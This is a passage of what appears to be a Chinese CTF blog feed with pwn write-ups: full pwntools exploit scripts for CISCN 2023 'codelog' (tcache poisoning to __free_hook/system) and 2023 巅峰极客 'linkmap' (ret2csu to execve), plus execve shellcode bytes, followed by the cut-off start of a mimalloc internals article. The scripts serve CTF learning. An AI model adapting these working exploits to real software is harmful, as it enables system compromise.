class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4060[<span class="number">0</span>] = printf_nop;</span><br><span class="line">  qword_4068 = printf_nop;</span><br><span class="line">  qword_4070 = printf_nop;</span><br><span class="line">  qword_4078 = printf_nop;</span><br><span class="line">  qword_4080 = printf_nop;</span><br><span class="line">  qword_4088 = printf_nop;</span><br><span class="line">  qword_4090 = printf_nop;</span><br><span class="line">  qword_4098 = printf_nop;</span><br><span class="line">  qword_40A0 = printf_nop;</span><br><span class="line">  qword_40A8 = printf_nop;</span><br><span class="line">  qword_40B0 = sub_12BB;</span><br><span class="line">  qword_40B8 = sub_1208 + <span class="number">1</span>;</span><br><span class="line">  qword_40C0 = printf_nop;</span><br><span class="line">  qword_40C8 = sub_1262;</span><br><span class="line">  qword_40D0 = printf_nop;</span><br><span class="line">  result = sub_1314;</span><br><span class="line">  qword_40D8 = sub_1314;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便在main函数的开头 还隐藏着一个buf地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure><p>我们通过字符’0’就可以实现call buf 这里就存在了shellcode的调用</p><p>由于我们刚才说到的check的存在 我们没办法把shellcode放到payload后面 所以需要通过把shellcode写到不会被check的前面 然后控制rsp寄存器再跳转过去</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.92.7.93&quot;,8802)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your expression:&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add rsp,0x10</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;\x35\x40\x35\x40\x30\x30\x30\x30&#x27;</span>+<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>+cyclic(<span class="number">0x21</span>)+p64(<span class="number">0x4014000000000000</span>)*<span class="number">2</span>+asm(shellcode)+<span class="string">b&#x27;\x40\x40&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x187a)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>Ciscn2023决赛</title>
    <link href="http://example.com/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/"/>
    <id>http://example.com/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/</id>
    <published>2023-07-26T04:51:33.000Z</published>
    <updated>2023-09-14T17:18:45.364Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="codelog"><a href="#codelog" class="headerlink" title="codelog"></a>codelog</h2><p>一道看起来是序列化的简单堆题。。。 被赛方开赛前说的有两题序列化protobuf跟flatbuffers坑了</p><p>导致先去看了第三题的正常堆 结果一个数独逆不出来。。。 结果爆零噜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        init_code(v16, v3, v4, v5, v6, v7, v18, v19, v20, v21);</span><br><span class="line">        v18 = v16[<span class="number">0</span>];</span><br><span class="line">        v19 = v16[<span class="number">1</span>];</span><br><span class="line">        v20 = v16[<span class="number">2</span>];</span><br><span class="line">        v21 = v16[<span class="number">3</span>];</span><br><span class="line">        check_number = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check_number != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        open_flag();</span><br><span class="line">        encode(s1, v3, v8, v9, v10, v11, v18, v19, v20, v21);</span><br><span class="line">        close_flag();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( check_number != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        open_flag();</span><br><span class="line">        decode(s1, v3, v12, v13, v14, v15, v18, v19, v20);</span><br><span class="line">        close_flag();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show_code(s1, v3, v4, v5, v6, v7, v18, v19, v20, v21);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show_tree(v19, <span class="number">2</span> * v20 - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑就是菜单 不过有几个函数起到了一个误导作用</p><p>关键的漏洞有两个 一个是init_code函数中存在了一个scanf引起的堆溢出 还有一个是没有开启PIE保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272227538.png" title="image-20230727222709447" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272227538.png" alt="image-20230727222709447"></a></p><p>实际其他函数都是一个误导作用  我们只需要利用init_code函数的堆溢出 覆盖tcachebin的fd域 使得申请到bss段上 从而向存放chunk指针的数组写入got表的地址 这样就可以借助show函数把libc地址泄露出来了 随后利用同样的手法打free_hook</p><p>唯一要注意的就是init_code本身会对堆构造产生影响 所以需要自己动调注意一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.92.7.93&quot;,8802)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">size,char,weight</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">        io.sendline(char)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(weight))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,log</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Add_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log: &quot;</span>)</span><br><span class="line">    io.sendline(log)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Delete_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Print_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Init_much</span>(<span class="params">size,char,weight,char2,weight2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">    io.sendline(char)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(weight))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">    io.sendline(char2)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(weight2))</span><br><span class="line">Init(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>-<span class="number">0x2</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0x405230</span>)</span><br><span class="line">Init_much(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,payload,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(puts_got))<span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = cyclic(<span class="number">0xe</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(free_hook)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401AE1&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">Init_much(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,payload,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>2023巅峰极客</title>
    <link href="http://example.com/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
    <id>http://example.com/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</id>
    <published>2023-07-21T07:36:56.000Z</published>
    <updated>2023-09-14T17:21:17.772Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这次比赛难度比较大 只做出了一题 不过哪怕是这一题都有很大的收获 记录一下</p><h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307211539513.png" title="image-20230721153857449" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307211539513.png" alt="image-20230721153857449"></a></p><p>开启了FULL RELRO 导致got表不可写 这将成为我们后续利用的一大阻碍</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_40071B(a1, a2, a3);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的主体逻辑非常简单 单单提供了一次栈溢出的机会</p><p>不过还给了几个看起来很奇怪的函数 我们发现他们的功能都是可以往bss段写入数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400606</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点观察一下上面的函数 前两行我们可以把任意地址的内容写到任意地址上</p><p>像这种没有提供输出函数的栈溢出题目 一般都是通过覆盖got表 要么是覆盖setvbuf来获得puts函数</p><p>要么是覆盖read函数来获得syscall 但是由于这题开启了got表 一开始我是想打消念头的</p><p>但是不知道你还记不记得 在栈的学习初期 我们学过ret2csu 其调用函数时通过call指令来调用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007C0                 mov     rdx, r13</span><br><span class="line">.text:00000000004007C3                 mov     rsi, r14</span><br><span class="line">.text:00000000004007C6                 mov     edi, r15d</span><br><span class="line">.text:00000000004007C9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004007CD                 add     rbx, 1</span><br><span class="line">.text:00000000004007D1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004007D4                 jnz     short loc_4007C0</span><br><span class="line">.text:00000000004007D6</span><br><span class="line">.text:00000000004007D6 loc_4007D6:                             ; CODE XREF: init+34↑j</span><br><span class="line">.text:00000000004007D6                 add     rsp, 8</span><br><span class="line">.text:00000000004007DA                 pop     rbx</span><br><span class="line">.text:00000000004007DB                 pop     rbp</span><br><span class="line">.text:00000000004007DC                 pop     r12</span><br><span class="line">.text:00000000004007DE                 pop     r13</span><br><span class="line">.text:00000000004007E0                 pop     r14</span><br><span class="line">.text:00000000004007E2                 pop     r15</span><br><span class="line">.text:00000000004007E4                 retn</span><br></pre></td></tr></table></figure><p>这题之所以困扰我们 是因为开启了FULL RELRO导致的got表不可覆盖 那么如果我们利用漏洞函数把read函数的真实地址写到bss段 而bss段是可以写的 我们可以将其覆盖最后一位为syscall 随后利用ret2csu来调用  就可以达到目的</p><p>随后我们利用read函数输入0x3b个字节 就可以达到控制rax寄存器 随后设置rdi寄存器和rsi寄存器 最后调用syscall 就可以实现execve(“&#x2F;bin&#x2F;sh”,0)</p><p>难点主要在于无法同时进行read控制rax和ret2csu 这样会导致输入的长度过多 我们需要把ret2csu部分的payload单独放到其他内存 然后在控制完rax寄存器后跳转过去</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn-b5c90fa468.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x00000000004007e3</span></span><br><span class="line">setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">ptr_read = <span class="number">0x400752</span></span><br><span class="line">csu_addr = <span class="number">0x4007DA</span></span><br><span class="line">csu2_addr = <span class="number">0x4007C0</span></span><br><span class="line">main_addr = <span class="number">0x400740</span></span><br><span class="line">read_addr = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">magic_addr = <span class="number">0x601030</span></span><br><span class="line">rbp_addr = <span class="number">0x0000000000400570</span></span><br><span class="line">rsp_addr = <span class="number">0x00000000004007dd</span></span><br><span class="line">a_addr = <span class="number">0x40067c</span></span><br><span class="line">rsi_r15 = <span class="number">0x00000000004007e1</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x500</span>)+<span class="number">0x10</span>)+p64(ptr_read)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x8</span>)+p64(ptr_read)+p64(elf.bss(<span class="number">0x500</span>))+p64(rdi_addr)+p64(read_got)+p64(<span class="number">0x400606</span>)+p64(ptr_read)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+cyclic(<span class="number">0x8</span>)+p64(elf.bss(<span class="number">0xa00</span>))+p64(ptr_read)+cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x800</span>))+p64(ptr_read)+p64(csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x601530</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x601500</span>)+p64(csu2_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(elf.bss(<span class="number">0x800</span>))+p64(read_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(csu_addr)+cyclic(<span class="number">0x18</span>)+p64(rsp_addr)+p64(elf.bss(<span class="number">0xa00</span>)-<span class="number">0x8</span>)+p64(<span class="number">0</span>)+cyclic(<span class="number">0x3</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4007C9&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>MiMalloc</title>
    <link href="http://example.com/2023/07/19/MiMalloc%E8%AF%A6%E8%A7%A3/"/>
    <id>http://example.com/2023/07/19/MiMalloc%E8%AF%A6%E8%A7%A3/</id>
    <published>2023-07-19T06:27:44.000Z</published>
    <updated>2023-09-14T17:19:59.588Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在今年的HWS中遇到了一道堆 与往常不同的是 c语言标准库中的malloc分配器更换成了mimalloc 于是打算来了解一下这个分配器 查看一下这个分配器要如何利用</p><p>同时由于本人水平不足 对于mimalloc源码的分析不到位 很多地方也是一知半解 只能起到一个面向pwn解题的分析</p><p>个人认为相比起用ptmalloc锻炼源码分析能力 mimalloc更加轻量化 更能起到练手的一个效果</p><h2 id="编译环境配置"><a href="#编译环境配置" class="headerlink" title="编译环境配置"></a>编译环境配置</h2><p>本小节用来指引如何在ubuntu中配置c语言调用mimalloc库 如果没有需要自己编译题目来调试的 就不需要看</p><p><a href="https://github.com/microsoft/mimalloc">Microsoft &#x2F; Mimalloc：Mimalloc是一款紧凑的通用分配器，具有出色的性能。 (github.com)</a></p><p>首先git clone库到本地</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/microsoft/mimalloc.git</span><br></pre></td></tr></table></figure><p>随后创建一个目录用来存放构建后的项目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmake ../mimalloc/</span><br><span class="line">make</span><br><span class="line">sudo make install </span><br></pre></td></tr></table></figure><p>接着是比较麻烦的一步 因为在执行完make install后 官方文档是说会在&#x2F;usr&#x2F;include中安装头文件 但是我实测是没有的 所以我们需要手动把头文件复制到对应目录中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp -r /home/chen/mimalloc/include/* /usr/include/</span><br></pre></td></tr></table></figure><p>随后我们在使用gcc编译的时候 在后面加上-lmimalloc  就可以成功编译了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test ./test.c -lmimalloc</span><br></pre></td></tr></table></figure><p>如果需要用到pwndbg进行源码调试的 需要编译.so文件的时候加上-DCMAKE_BUILD_TYPE&#x3D;Debug 参照官方文档</p><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><p>对于每一个线程 都有对应的内存用来管理线程 我们称其为TLD</p><p>TLD主要由两个部分组成 segment和heap 我们先来介绍segment</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202325016.png" title="image-20230720232504990" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202325016.png" alt="image-20230720232504990"></a></p><p>这里的page就是实际分配给用户的内存 而第一个page的大小会小于其他page  是因为segment头部用来存放了当前segment的信息 占用了page的一部分空间</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202326091.png" 